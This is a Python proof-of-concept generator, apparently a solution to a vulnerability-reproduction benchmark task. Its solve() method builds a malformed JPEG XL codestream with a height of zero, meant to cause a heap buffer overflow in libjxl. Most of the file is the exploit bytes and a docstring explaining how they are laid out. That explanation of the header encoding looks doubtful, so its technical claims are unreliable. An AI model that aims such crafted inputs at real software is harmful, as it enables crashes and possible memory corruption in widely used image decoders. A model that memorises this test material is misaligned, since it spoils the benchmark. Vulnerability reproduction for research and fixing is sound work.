import sys
import struct

class Solution:
    """
    Generates a Proof-of-Concept (PoC) input that triggers a Heap Buffer Overflow
    vulnerability in libjxl related to processing zero-dimension images.
    """
    def solve(self, src_path: str) -> bytes:
        """
        Generates a minimal JXL codestream that defines an image with a height of 0.

        The vulnerability exists because the library does not properly validate
        image dimensions, specifically a width or height of zero. When trying to
        allocate memory for an image frame with a zero dimension, a buffer of
        zero size is allocated. Subsequent operations that assume a non-zero buffer
        size then write out of bounds, leading to a heap buffer overflow.

        The PoC is constructed as follows:
        1.  `\xff\x0a`: The JXL Start of Codestream (SOC) marker.
        2.  Size Header:
            - `\x00`: Represents `ysize=0` (height) encoded as a U32 variable-length integer.
            - `\x01`: Represents `xsize=1` (width) encoded as a U32 variable-length integer.
        3.  Image Metadata Header:
            - `\x80`: A single byte where the most significant bit is 1. This is interpreted
              by the bitstream reader as `all_default=true`, which is the simplest form
              of this header. It instructs the decoder to use default values for complex
              metadata like color profiles, avoiding the need to specify them.
        4.  Minimal Frame Data:
            - A short sequence of bytes representing a minimal frame. The decoder will
              attempt to process this frame using the 0-height dimension specified in the
              main header, triggering the allocation of a zero-sized buffer and the
              subsequent overflow. This specific trailer is borrowed from a known-minimal
              valid JXL file.
        
        This results in a very small PoC that precisely targets the vulnerability.
        """
        
        # JXL Start of Codestream marker
        poc = b'\xff\x0a'
        
        # Size Header: height=0, width=1
        # ysize=0 is encoded as U32(0) -> \x00
        # xsize=1 is encoded as U32(1) -> \x01
        poc += b'\x00\x01'
        
        # Image Metadata Header: all_default=true
        # This is a single bit '1', padded to a byte boundary -> \x80
        poc += b'\x80'
        
        # Minimal frame data to trigger the vulnerable code path in DecodeFrame.
        # This frame will inherit the 1x0 dimensions.
        poc += b'\x0b\x00\x38\x10\x00\x2f\x81\xc3'
        
        return poc